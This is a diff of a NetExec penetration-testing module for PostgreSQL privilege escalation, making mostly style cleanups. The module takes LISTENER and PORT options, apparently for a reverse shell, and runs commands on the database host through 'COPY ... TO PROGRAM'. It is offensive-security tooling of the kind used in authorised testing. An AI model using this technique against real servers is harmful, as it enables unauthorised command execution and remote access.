@@ -1,7 +1,7 @@
 import psycopg
 from psycopg import sql
 from nxc.helpers.misc import CATEGORY
-#from nxc.logger import NXCAdapter
+
 
 class NXCModule:
     """
@@ -14,7 +14,6 @@ class NXCModule:
     supported_protocols = ["postgres"]
     category = CATEGORY.PRIVILEGE_ESCALATION
 
-
     def options(self, context, module_options):
         """
         LISTENER    LISTENERE IP
@@ -24,7 +23,7 @@ class NXCModule:
         """
         self.listener = None
         self.port = None
-        self.method = 'bash'
+        self.method = "bash"
 
         if "LISTENER" not in module_options and "PORT" not in module_options:
             context.log.fail("Required parameters were not provided")
@@ -33,7 +32,6 @@ class NXCModule:
         self.listener = module_options["LISTENER"]
         self.port = module_options["PORT"]
         self.method = module_options.get("METHOD") or "bash"
-        
 
     def on_login(self, context, connection):
         """Runs once credentials have been validated by postgres.plaintext_login()."""
@@ -54,8 +52,7 @@ class NXCModule:
             try:
                 with conn.cursor() as cur:
                     cur.execute(sql.SQL("COPY (SELECT '') TO PROGRAM {}").format(sql.Literal(cmd)))
-                    #rows = cur.fetchall()[0]
-                    context.log.success(f"Success")
+                    context.log.success("Success")
             except Exception as e:
                 context.log.fail(f"Error: {e}")
                 return
